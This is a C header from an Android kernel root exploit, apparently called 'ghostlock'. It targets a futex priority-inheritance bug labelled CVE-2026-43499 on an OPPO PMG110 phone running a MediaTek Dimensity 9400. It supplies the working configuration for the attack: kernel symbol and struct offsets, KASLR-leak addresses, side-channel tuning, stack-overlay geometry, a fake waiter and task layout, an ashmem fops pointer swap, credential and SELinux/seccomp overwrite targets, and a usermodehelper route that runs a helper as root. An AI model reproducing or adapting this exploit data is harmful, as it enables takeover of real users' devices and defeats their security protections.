#ifndef TARGET_H
#define TARGET_H

/* OPPO PMG110 — ColorOS 16.0.8 (PMG110_16.0.8.300 CN01), MT6991 / Dimensity 9400
 *
 *   kernel 6.6.118-android15-8-g93e223c276e7-abogki500782043-4k  (GKI, 4K pages)
 *   build  OPPO/PMG110/OP61E5L1:16/BP2A.250605.015/...:user/release-keys
 *
 * Build with:  make TARGET=pmg110
 *
 * Everything here was derived from the stock OTA boot.img by
 *   python3 tools/extract_device.py boot.img --name pmg110
 * except P0_KERNEL_PHYS_LOAD, which comes from preloader_raw.img (see below).
 *
 * The futex-PI bug is present in this build. remove_waiter() is out-of-line at
 * image offset 0x01077ff4 and operates on `current` (mrs x20, sp_el0; then
 * `str xzr, [x20, #0x938]` for pi_blocked_on) rather than on waiter->task, and
 * rt_mutex_start_proxy_lock+0x44 calls it on the failure path. That is the
 * unfixed shape of CVE-2026-43499; the stable fix first shipped in 6.6.140 and
 * this kernel is 6.6.118. The same disassembly re-confirms FAKE_TASK_PI_LOCK_OFF
 * (0x90c), FAKE_TASK_PI_WAITERS_OFF (0x920), FAKE_TASK_PI_BLOCKED_ON_OFF (0x938)
 * and WAITER_LOCK_OFF (0x58) below.
 *
 * Why this file exists at all: only main.c re-points the *_OFF macros at the
 * runtime known_offsets[] table. fops.c, root.c, util.c, pipe.c and slide.c
 * use the compile-time values from here, so a device on a different kernel
 * series needs its own target.h, not just an offsets.h entry.
 */

#define BUILD_VARIANT_LABEL "ghostlock_pmg110"
#define BUILD_FINGERPRINT "oppo/pmg110"
/* Struct-layout identity of this header; must match the .layout of whichever
 * offsets.h entry the running kernel selects. See src/devices/offsets.h. */
#define TARGET_LAYOUT_ID "pmg110-6.6"

/* ---------------------------------------------------------------- memory ---
 * VA_BITS=39 — confirmed by _text = 0xffffffc080000000 in the image kallsyms.
 */
#define KIMAGE_TEXT_BASE 0xffffffc080000000ULL
#define P0_PAGE_OFFSET 0xffffff8000000000ULL

/* DRAM base, from the /memory node of the MT6991 DTB in vendor_boot. */
#define P0_PHYS_OFFSET 0x80000000ULL

/* Physical address the bootloader loads the kernel Image at.
 *
 * MT6991 lk does not carry this as a compiled-in constant — it takes the
 * address from the mblock allocator, which lk populates from the memory map
 * the preloader hands over in the PL2LK boot tag. So it is not in lk.img and
 * not in boot.img. It *is* in the preloader: `preloader_raw.img` embeds the
 * memory-layout table that seeds mblock, and its `mb_kernel` region start is
 * the kernel load address.
 *
 *     mb_kernel  0x0080000000  size 0x07c80000  align 0x10000
 *
 * read with the MediaTek preloader parser from the warhol port. That same
 * derivation (`mb_kernel.start` -> P0_KERNEL_PHYS_LOAD) is what the MT6993
 * port used, and it was confirmed correct there against a real device, which
 * is the only reason it is trusted here rather than left unset.
 *
 * The value is identical in the two firmware revisions checked
 * (16.0.8.300 / A.19 and 16.0.9.400 / A.20 — all 12 layout entries match), so
 * it is a per-SoC-config constant, not a per-build one.
 *
 * Note that it lands exactly on the DRAM base, i.e. P0_KERNEL_PHYS_DELTA == 0.
 * The SM8845 devices in this tree sit 0x28000000 above theirs; that difference
 * is expected, not a sign of a misread table.
 *
 * QEMU (tools/qemu_verify.py --mode linear) settles the other half: booting
 * this kernel with five KASLR seeds / RAM sizes / PA widths leaves
 * memstart_addr equal to the DRAM base every time — arm64's linear-map
 * randomisation never fires at VA_BITS=39. So the physmap alias is
 * KASLR-independent and this is one fixed number per firmware.
 *
 * To check it against a running device, or to override without a rebuild:
 *     adb shell su -c 'grep -i "Kernel code" /proc/iomem'
 *     GHOSTLOCK_PHYS_LOAD=0x... /data/local/tmp/a/e
 */
#ifndef P0_KERNEL_PHYS_LOAD
#define P0_KERNEL_PHYS_LOAD 0x80000000ULL
#endif

/* Conservative bounds, not measured spans. The linear map for VA_BITS=39 runs
 * to 0xffffffc000000000; MT6991 DRAM is contiguous from P0_PHYS_OFFSET, so any
 * shipping RAM size falls well inside these. Widening only costs scan time.
 */
#define KERNELSNITCH_IDENTITY_START 0xffffff8000000000ULL
#define KERNELSNITCH_IDENTITY_END   0xffffff8c00000000ULL
#define DIRECT_MAP_BASE 0xffffff8000000000ULL
#define DIRECT_MAP_END 0xffffff9000000000ULL
#define VMEMMAP_START 0xfffffffe00000000ULL

/* ------------------------------------------- KernelSnitch geometry ---------
 * These describe kernel-side allocator and hash-table shapes, so they belong
 * to a kernel build the same way the struct offsets do. They used to live in
 * common.h, where a 6.12 value silently applied to every device.
 *
 * MM_STRUCT_SZ is the mm_cachep object size, not sizeof(struct mm_struct).
 * mm_cache_init() asks for
 *     sizeof(struct mm_struct) + cpumask_size() + mm_cid_size()
 * with SLAB_HWCACHE_ALIGN. Here: BTF says sizeof = 1216 (0x4c0), the embedded
 * .config has CONFIG_NR_CPUS=32 and no CONFIG_CPUMASK_OFFSTACK so
 * cpumask_size() = 8, and rounding up to the 64-byte cache line gives 1280.
 * The scan enumerates candidates as slab_base + k*MM_STRUCT_SZ, so a wrong
 * value here means it steps straight past the real object.
 */
#define MM_STRUCT_SZ 0x500
#define MM_ORDER 3

/* futex_init(): roundup_pow_of_two(256 * num_possible_cpus()).
 * futex_hash() masks with (futex_hashsize - 1), so this MUST be a power of
 * two. Confirmed on device: "futex_hashsize 2048 (8 possible CPUs)". */
#define FUTEX_HASHSIZE 2048

/* Kernel heap pointers carry a tag in bits [59:56] when KASAN_HW_TAGS is
 * active, and the futex key hashes the whole mm pointer -- so an untagged
 * scan can never match. This kernel has CONFIG_KASAN_HW_TAGS=y and
 * CONFIG_ARM64_MTE=y compiled in, but on a production build it stays off
 * unless the bootloader passes kasan=on, so the default is untagged.
 * GHOSTLOCK_MTE=1 turns the tag search on without a rebuild.
 * Confirmed on device: the untagged sweep finds the mm_struct, so whatever is
 * compiled in is not tagging kernel heap pointers on this build. */
#define KS_MTE_TAGGED 0

/* Collision threshold for KernelSnitch's timing side channel: a futex whose
 * hash-bucket walk takes more than this many times an empty bucket counts as
 * a collision. A property of the SoC's memory system, not of the kernel.
 * Confirmed on MT6991 with a wide margin, so the SM8845 value carries over
 * rather than merely being inherited: baseline 8, threshold 80, accepted
 * 1244..1597 -- about 150x the baseline. Sweep with GHOSTLOCK_KS_THRESHOLD
 * only if a future build shows accepted times near the threshold. */
#define KERNELSNITCH_THRESHOLD_MULT 10

/* ------------------------------------------- global symbols (kallsyms) --- */
#define INIT_TASK_OFF          0x0213e780ULL
#define INIT_CRED_OFF          0x02150c48ULL
#define INIT_UTS_NS_OFF        0x022c41c8ULL
#define EMPTY_ZERO_PAGE_OFF    0x02330000ULL
#define ROOT_TASK_GROUP_OFF    0x02338580ULL
#define SELINUX_ENFORCING_OFF  0x0237b220ULL
#define KPTR_RESTRICT_OFF      0x0213c1f8ULL
/* no security_hook_active_capable_* symbol on this 6.6 build */
#define CAP_CAPABLE_ACTIVE_OFF 0ULL
#define KPTR_RESTRICT          (KIMAGE_TEXT_BASE + KPTR_RESTRICT_OFF)
#define SELINUX_BLOB_SIZES_OFF 0x0168ea28ULL
#define SECURITY_HOOK_HEADS_OFF 0x0168e2f0ULL
#define KMALLOC_CACHES_OFF     0x0168de30ULL
#define ANON_PIPE_BUF_OPS_OFF  0x0117f188ULL
/* The *plain* configfs_read_iter, not configfs_bin_read_iter. The read
 * primitive plants buffer->page and clears needs_read_fill, which is the plain
 * one's contract; the bin one copies from bin_buffer/bin_buffer_size, which
 * that blob leaves at zero, and reaches to_frag(file) unconditionally at +0x3c
 * -- above its own mutex_lock -- through a dentry whose d_fsdata is a tmpfs
 * directory index rather than a configfs_dirent.
 *
 * Which symbol is which was read out of this image's own tables:
 *
 *   configfs_file_operations     @ image 0x118a4c0  read_iter 0x0049f8ec
 *   configfs_bin_file_operations @ image 0x118a5c8  read_iter 0x0049fc10
 *
 * and the bin address is what a run with it panicked at, to the byte:
 * configfs_bin_read_iter+0x3c faulting on 0x96, i.e. index 70 + the 0x50 that
 * is offsetof(struct configfs_dirent, s_frag). */
#define CONFIGFS_READ_ITER_OFF      0x0049f8ecULL
#define CONFIGFS_BIN_WRITE_ITER_OFF 0x0049fe18ULL
#define COPY_SPLICE_READ_OFF   0x004235e0ULL
#define NOOP_LLSEEK_OFF        0x003d6340ULL
/* C ashmem (drivers/staging/android/ashmem.c), not the Rust driver.
 * ASHMEM_MISC_FOPS is the fops *pointer slot* the exploit swaps, i.e.
 * &ashmem_misc.fops == ashmem_misc + offsetof(struct miscdevice, fops).
 */
#define ASHMEM_MISC_FOPS_OFF   0x0229d268ULL
#define ASHMEM_FOPS_OFF        0x012fff00ULL
#define ASHMEM_IOCTL_OFF       0x00c9b0b0ULL
#define ASHMEM_COMPAT_IOCTL_OFF 0x00c9b76cULL
#define ASHMEM_MMAP_OFF        0x00c9b7c0ULL
#define ASHMEM_OPEN_OFF        0x00c9b9e0ULL
#define ASHMEM_RELEASE_OFF     0x00c9ba68ULL
#define ASHMEM_SHOW_FDINFO_OFF 0x00c9baf4ULL

/* KASLR leak */
#define SLIDE_NFULNL_LOGGER_OFF       0x02132750ULL
#define SLIDE_LOGGERS_0_1_OFF         0x021326a8ULL
#define SLIDE_RANDOM_BOOT_ID_DATA_OFF 0x0239c218ULL
#define SLIDE_SYSCTL_BOOTID_OFF       0x0239c218ULL

/* Derived macros */
#define INIT_TASK           (KIMAGE_TEXT_BASE + INIT_TASK_OFF)
#define INIT_CRED           (KIMAGE_TEXT_BASE + INIT_CRED_OFF)
#define INIT_UTS_NS         (KIMAGE_TEXT_BASE + INIT_UTS_NS_OFF)
#define EMPTY_ZERO_PAGE     (KIMAGE_TEXT_BASE + EMPTY_ZERO_PAGE_OFF)
#define ROOT_TASK_GROUP     (KIMAGE_TEXT_BASE + ROOT_TASK_GROUP_OFF)
#define SELINUX_ENFORCING   (KIMAGE_TEXT_BASE + SELINUX_ENFORCING_OFF)
#define SELINUX_BLOB_SIZES  (KIMAGE_TEXT_BASE + SELINUX_BLOB_SIZES_OFF)
#define SECURITY_HOOK_HEADS (KIMAGE_TEXT_BASE + SECURITY_HOOK_HEADS_OFF)
#define KMALLOC_CACHES      (KIMAGE_TEXT_BASE + KMALLOC_CACHES_OFF)
#define ANON_PIPE_BUF_OPS   (KIMAGE_TEXT_BASE + ANON_PIPE_BUF_OPS_OFF)
#define ASHMEM_MISC_FOPS    (KIMAGE_TEXT_BASE + ASHMEM_MISC_FOPS_OFF)
#define ASHMEM_FOPS         (KIMAGE_TEXT_BASE + ASHMEM_FOPS_OFF)
#define ASHMEM_IOCTL        (KIMAGE_TEXT_BASE + ASHMEM_IOCTL_OFF)
#define ASHMEM_COMPAT_IOCTL (KIMAGE_TEXT_BASE + ASHMEM_COMPAT_IOCTL_OFF)
#define ASHMEM_MMAP         (KIMAGE_TEXT_BASE + ASHMEM_MMAP_OFF)
#define ASHMEM_OPEN         (KIMAGE_TEXT_BASE + ASHMEM_OPEN_OFF)
#define ASHMEM_RELEASE      (KIMAGE_TEXT_BASE + ASHMEM_RELEASE_OFF)
#define ASHMEM_SHOW_FDINFO  (KIMAGE_TEXT_BASE + ASHMEM_SHOW_FDINFO_OFF)
#define CONFIGFS_READ_ITER      (KIMAGE_TEXT_BASE + CONFIGFS_READ_ITER_OFF)
#define CONFIGFS_BIN_WRITE_ITER (KIMAGE_TEXT_BASE + CONFIGFS_BIN_WRITE_ITER_OFF)
#define COPY_SPLICE_READ    (KIMAGE_TEXT_BASE + COPY_SPLICE_READ_OFF)
#define NOOP_LLSEEK         (KIMAGE_TEXT_BASE + NOOP_LLSEEK_OFF)
#define SLIDE_NFULNL_LOGGER_IMAGE       (KIMAGE_TEXT_BASE + SLIDE_NFULNL_LOGGER_OFF)
#define SLIDE_LOGGERS_0_1_IMAGE         (KIMAGE_TEXT_BASE + SLIDE_LOGGERS_0_1_OFF)
#define SLIDE_RANDOM_BOOT_ID_DATA_IMAGE (KIMAGE_TEXT_BASE + SLIDE_RANDOM_BOOT_ID_DATA_OFF)
#define SLIDE_INIT_TASK_IMAGE           (KIMAGE_TEXT_BASE + INIT_TASK_OFF)
#define SLIDE_ROOT_TASK_GROUP_IMAGE     (KIMAGE_TEXT_BASE + ROOT_TASK_GROUP_OFF)
#define SLIDE_SYSCTL_BOOTID_IMAGE       (KIMAGE_TEXT_BASE + SLIDE_SYSCTL_BOOTID_OFF)

/* ---------------------------------------------------- pselect overlay ------
 * QEMU measured on this kernel: tools/qemu_verify.py --mode stack boots the
 * image under -M virt and breaks on both syscall entries from one task.
 *
 *   core_sys_select        entry SP 0xffffffc08000bd70  frame 0x1f0,
 *                          stack_fds at sp+0x80   (caller __arm64_sys_pselect6)
 *   futex_wait_requeue_pi  entry SP 0xffffffc08000bd30  frame 0x1c0,
 *                          rt_waiter at sp+0x90   (caller do_futex)
 *   measured entry-SP delta = -64, same kernel stack, stable over 4 rounds
 *   rt_waiter == stack_fds == 0xffffffc08000bc00  ->  waiter word 0
 *
 * The freed waiter lands exactly on stack_fds[0]; lock ends up at word 11,
 * inside the user-controlled 0..14 range, so the overlay is feasible.
 *
 * The -64 also falls out statically from the call-chain frames, which is how
 * a port can be scoped before booting anything:
 *   (__arm64_sys_pselect6 0x90) - (__arm64_sys_futex 0x70 + do_futex 0x60)
 * Both routes call libc select(), which on arm64 is the pselect6 syscall
 * (arm64 has no __NR_select), so pselect6 is the right chain for both.
 *
 * fops.c's words[] is written for a waiter at word 2  -> shift = 0 - 2 = -2
 * slide.c's words[] indexes the waiter from word 0    -> shift = 0
 */
#define PSELECT_WAITER_WORD_SHIFT -2
#define SLIDE_PSELECT_WORD_SHIFT 0
#define SLIDE_PSELECT_NFDS 320
#define SLIDE_USE_SELECT 1

/* ------------------------------------------- struct fields (BTF verified) --
 * Read from the kernel's own BTF. These are 6.6 layouts and differ from the
 * 6.12 layouts in src/core/target.h — notably file_operations, which gained
 * fop_flags after `owner` in 6.12 and shifted llseek..mmap by 8.
 */
#define WAITER_LOCAL_OFF          0x80
#define WAITER_TREE_ENTRY_OFF     0x00
#define WAITER_PI_TREE_ENTRY_OFF  0x28
#define WAITER_TASK_OFF           0x50
#define WAITER_LOCK_OFF           0x58
#define WAITER_WAKE_STATE_OFF     0x60
#define WAITER_PRIO_OFF           0x18
#define WAITER_DEADLINE_OFF       0x20
#define WAITER_WW_CTX_OFF         0x68

#define FAKE_WAITER_TREE_PRIO_OFF         0x18
#define FAKE_WAITER_TREE_DEADLINE_OFF     0x20
#define FAKE_WAITER_PI_TREE_ENTRY_OFF     0x28
#define FAKE_WAITER_PI_TREE_PRIO_OFF      0x40
#define FAKE_WAITER_PI_TREE_DEADLINE_OFF  0x48
#define FAKE_WAITER_TASK_OFF              0x50
#define FAKE_WAITER_LOCK_OFF              0x58
#define FAKE_WAITER_WAKE_STATE_OFF        0x60
#define FAKE_WAITER_WW_CTX_OFF            0x68

/* task_struct — sizeof = 0x12c0 */
#define FAKE_TASK_USAGE_OFF          0x40
#define FAKE_TASK_PRIO_OFF           0x84
#define FAKE_TASK_NORMAL_PRIO_OFF    0x8c
#define FAKE_TASK_TASK_GROUP_OFF     0x348
#define FAKE_TASK_PI_LOCK_OFF        0x90c
#define FAKE_TASK_PI_WAITERS_OFF     0x920
#define FAKE_TASK_PI_TOP_TASK_OFF    0x930
#define FAKE_TASK_PI_BLOCKED_ON_OFF  0x938

/* mm_struct.owner sits in an anonymous struct; value comes from the BTF
 * brute-force path in tools/extract_btf.py and is not used by the exploit. */
#define MM_OWNER_OFF             0x2b0
#define TASK_PID_OFF             0x618
#define TASK_TGID_OFF            0x61c
#define TASK_REAL_PARENT_OFF     0x628
#define TASK_ATOMIC_FLAGS_OFF    0x5d8
#define TASK_REAL_CRED_OFF       0x818
#define TASK_CRED_OFF            0x820
#define TASK_COMM_OFF            0x830
#define TASK_TASKS_OFF           0x550
#define TASK_THREAD_INFO_FLAGS_OFF 0x00
#define TASK_SECCOMP_OFF         0x8e8

#define CRED_UID_OFF         8
#define CRED_SECUREBITS_OFF  40
#define CRED_CAPS_OFF        48
#define CRED_SECURITY_OFF    128
#define SELINUX_CRED_BLOB_OFF  0
#define SELINUX_CRED_OSID_OFF  0
#define SELINUX_CRED_SID_OFF   4
#define SECCOMP_MODE_OFF          0x00
#define SECCOMP_FILTER_COUNT_OFF  0x04
#define SECCOMP_FILTER_OFF        0x08
#define TIF_SECCOMP_BIT           11
#define PFA_NO_NEW_PRIVS_BIT      0

/* struct page: flags at 0, the big union at 0x08 (compound_head is its first
 * tail-page member), the 4-byte _mapcount/page_type union at 0x30 — pinned by
 * BTF reporting _refcount at 0x34 and sizeof(page) = 0x40. */
#define STRUCT_PAGE_SIZE              0x40
#define STRUCT_PAGE_COMPOUND_HEAD_OFF 0x08
#define STRUCT_SLAB_CACHE_OFF         0x08
#define STRUCT_PAGE_TYPE_OFF          0x30

/* pipe_inode_info — sizeof = 0xb8 */
#define PIPE_BUFFER_SIZE         0x28
#define PIPE_BUFFER_SLOTS        32
#define PIPE_BUF_FLAG_CAN_MERGE  0x10
#define PIPE_INODE_INFO_STRUCT_SIZE   0xb8
#define PIPE_INODE_INFO_SIZE          0xc0
#define PIPE_INODE_INFO_SLOTS_PER_PAGE 21
#define PIPE_HEAD_OFF                 0x60
#define PIPE_TAIL_OFF                 0x64
#define PIPE_MAX_USAGE_OFF            0x68
#define PIPE_RING_SIZE_OFF            0x6c
#define PIPE_NR_ACCOUNTED_OFF         0x70
#define PIPE_READERS_OFF              0x74
#define PIPE_WRITERS_OFF              0x78
#define PIPE_FILES_OFF                0x7c
#define PIPE_TMP_PAGE_OFF             0x90
#define PIPE_BUFS_OFF                 0xa8
#define PIPE_USER_OFF                 0xb0

/* file_operations — sizeof = 0x108 (6.6: no fop_flags) */
#define FOPS_OWNER_OFF        0x00
#define FOPS_LLSEEK_OFF       0x08
#define FOPS_READ_OFF         0x10
#define FOPS_WRITE_OFF        0x18
#define FOPS_READ_ITER_OFF    0x20
#define FOPS_WRITE_ITER_OFF   0x28
#define FOPS_IOCTL_OFF        0x48
#define FOPS_COMPAT_IOCTL_OFF 0x50
#define FOPS_MMAP_OFF         0x58
#define FOPS_OPEN_OFF         0x68
#define FOPS_RELEASE_OFF      0x78
#define FOPS_SPLICE_READ_OFF  0xb8
#define FOPS_SHOW_FDINFO_OFF  0xd8

/* Exploit-internal payload page layout (not kernel dependent) */
#define LOCK_OFF      0x0E80
#define W0_OFF        0x1180
#define FOPS_OFF      0x0F80
#define SCRATCH_OFF   0x1200
#define RIGHT_OFF     0x1240
#define LEFT_OFF      0x1260
#define FAKE_TASK_OFF 0x1280
#define CFG_PAGE_OFF            16
#define CFG_NEEDS_READ_FILL_OFF 80
#define CFG_BIN_BUFFER_OFF      88
#define CFG_BIN_BUFFER_SIZE_OFF 96
#define CFG_CB_MAX_SIZE_OFF     100

/* Write 2 specific */
#define CRED_COPY_OFF 0x1080


/* Where the bootstrap helper is staged for an adb-shell run. The application
 * passes its own copy down instead, through CVE43499_ROOT_HELPER, because the
 * APK's copy is at a path that is neither fixed nor writable from here. This
 * is the route run_exploit() takes: its credential write roots a forked child,
 * and that child execs the helper itself. */
#define ROOT_HELPER_PATH "/data/local/tmp/cve-2026-43499-root"

/* usermodehelper root route -- taken from this repository's own profile,
 * because root.c stays RMG's: the kernel execs the app's helper as root and
 * that helper is what serves -c and --late-load. Only the fops/pipe route
 * reaches it, which run_exploit() does not use on this core. */
#define ROOT_UMH_PATH "/data/local/tmp/cve-2026-43499-root"
#define CALL_USERMODEHELPER_EXEC_WORK_OFF 0x000d0f00ULL
#define SYSTEM_UNBOUND_WQ_OFF 0x0212b320ULL
#define CALL_USERMODEHELPER_EXEC_WORK \
  (KIMAGE_TEXT_BASE + CALL_USERMODEHELPER_EXEC_WORK_OFF)
#define SYSTEM_UNBOUND_WQ (KIMAGE_TEXT_BASE + SYSTEM_UNBOUND_WQ_OFF)
#define ROOT_UMH_WORK_OFF 0x6000
#define ROOT_UMH_DATA_OFF 0x6200
#define WQ_DFL_PWQ_OFF 0xb0
#define PWQ_POOL_OFF 0x00
#define PWQ_WQ_OFF 0x08
#define PWQ_WORK_COLOR_OFF 0x10
#define PWQ_REFCNT_OFF 0x18
#define PWQ_NR_IN_FLIGHT_OFF 0x1c
#define PWQ_NR_ACTIVE_OFF 0x5c
#define PWQ_MAX_ACTIVE_OFF 0x60
#define POOL_WORKLIST_OFF 0x28
#define POOL_NR_IDLE_OFF 0x3c
#define WORK_DATA_OFF 0x00
#define WORK_ENTRY_OFF 0x08
#define WORK_FUNC_OFF 0x18

#endif
